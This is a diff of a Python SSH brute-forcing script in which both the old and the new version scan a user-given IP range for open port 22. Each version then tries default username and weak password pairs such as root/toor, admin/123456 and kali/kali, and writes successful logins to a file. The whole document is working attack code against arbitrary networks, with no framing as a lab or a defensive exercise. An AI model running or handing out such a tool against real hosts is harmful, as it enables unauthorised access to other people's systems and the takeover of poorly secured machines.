@@ -1,115 +1,65 @@
-import argparse
 import ipaddress
-import progressbar
 import socket
-import threading
 import paramiko
+import threading
+from colorama import Fore, Style
 
+# Ask for user input of IP range
+ip_range = input("Enter IP range (e.g 127.0.0.0/24, 127.0.0.0-127.0.0.255, 127.0.0.0): ")
 
-def parse_arguments():
-    """Parse the command-line arguments"""
+# Convert IP range to a list of IP addresses
+ip_list = []
+if "/" in ip_range:
+    for ip in ipaddress.IPv4Network(ip_range, strict=False):
+        ip_list.append(str(ip))
+elif "-" in ip_range:
+    ip_range_split = ip_range.split("-")
+    ip_start = ipaddress.IPv4Address(ip_range_split[0])
+    ip_end = ipaddress.IPv4Address(ip_range_split[1])
+    for ip_int in range(int(ip_start), int(ip_end)):
+        ip_list.append(str(ipaddress.IPv4Address(ip_int)))
+else:
+    ip_list.append(ip_range)
 
-    parser = argparse.ArgumentParser(description="Scan an IP range for open SSH ports and attempt to authenticate.")
-    parser.add_argument("range",
-                        help="IP range in CIDR, hyphenated, or dotted decimal format."
-                             "Example: 127.0.0.1/24, 127.0.0.1-127.0.0.255, 127.0.0.1")
-    return parser.parse_args()
+# Define list of usernames and passwords to try
+usernames = ["root", "admin", "ubuntu", "kali"]
+passwords = ["toor", "123456", "qwerty", "kali", "admin", "debian"]
 
-
-def grab_banner(ip, port):
-    """Attempts to grab the SSH banner from the given IP address and port"""
-
-    banner = ""
+# Function to scan IP address for open port 22
+def scan_ip(ip):
     try:
-        sock = socket.socket()
-        sock.connect((ip, port))
-        sock.settimeout(2)
-        banner = sock.recv(1024).decode().strip()
-    except (socket.timeout, ConnectionRefusedError):
-        pass
-    finally:
-        sock.close()
-    return banner
+        # Check if port 22 is open
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((ip, 22))
+        s.close()
+        
+        # Attempt to log in using usernames and passwords
+        for username in usernames:
+            for password in passwords[:3]:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                try:
+                    ssh.connect(ip, port=22, username=username, password=password)
+                    print(f"{Style.BRIGHT}{Fore.GREEN}[SUCCESS] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
+                    with open("logins.txt", "a") as f:
+                        f.write(f"{ip} {username} {password}\n")
+                    ssh.close()
+                    return
+                except paramiko.AuthenticationException:
+                    print(f"{Fore.RED}[FAIL] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
+                    ssh.close()
+                except Exception as e:
+                    ssh.close()
+                    print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")
 
-
-def authenticate(ip, username, password, protocol):
-    """Attempts to authenticate using the supplied username and password on the given IP address"""
-
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        client.connect(ip, username=username, password=password, port=22,
-                       allow_agent=False, look_for_keys=False, banner_timeout=2, ssh_version=2 if protocol == "SSH-2.0" else 1)
-    except (paramiko.ssh_exception.AuthenticationException,
-            paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, OSError):
-        return False
-    finally:
-        client.close()
-    return True
-
-
-def brute_force(ip, username, passwords, protocol):
-    """Brute forces the login using the supplied usernames and passwords on the given IP address"""
-
-    for password in passwords:
-        if authenticate(ip, username, password, protocol):
-            print(f"\033[92m[+] Successfully authenticated with {username}:{password} on {ip}\033[0m")
-            with open("successful-logins.txt", "a") as f:
-                f.write(f"{ip},{username},{password}\n")
-            return
-    print(f"\033[91m[-] Failed to authenticate with {username} on {ip}\033[0m")
-
-
-def scan_range(ip_range):
-    """Scans the IP range for open SSH ports and attempt to authenticate"""
-
-    # Calculate the total number of IPs in the range
-    num_ips = len(list(ipaddress.IPv4Network(ip_range).hosts()))
-
-    with progressbar.ProgressBar(max_value=num_ips) as progress:
-        count = 0
-
-        for ip in ipaddress.IPv4Network(ip_range):
-            banner = grab_banner(str(ip), 22)
-            if not banner:
-                continue
-
-            print(f"\n[*] Scanning {ip}")
-            print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")
-
-            if "SSH-1.5" in banner:
-                protocol = "SSH-1.5"
-            else:
-                protocol = "SSH-2.0"
-
-            usernames = ["root", "admin", "ubuntu", "kali"]
-            passwords_try_1 = ["root", "kali", "123456"]
-            passwords_try_2 = ["qwerty", "debian", "admin"]
-
-            for username in usernames:
-                brute_force(ip, username, passwords_try_1, protocol)
-                if not authenticate(ip, username, passwords_try_1[0], protocol):
-                    continue
-                brute_force(ip, username, passwords_try_2, protocol)
-                break
-
-            count += 1
-            progress.update(count)
-
-
-def main():
-    args = parse_arguments()
-    ip_range = args.range
-
-    # Scan IP range using 10 threads
-    threads = []
-    for i in range(10):
-        t = threading.Thread(target=scan_range, args=(ip_range,))
-        threads.append(t)
-        t.start()
-    for t in threads:
-        t.join()
-
-
-if __name__ == "__main__":
-    main()
+# Scan IP ranges for open port 22
+threads = []
+for ip in ip_list:
+    t = threading.Thread(target=scan_ip, args=(ip,))
+    threads.append(t)
+    t.start()
+for thread in threads:
+    thread.join()
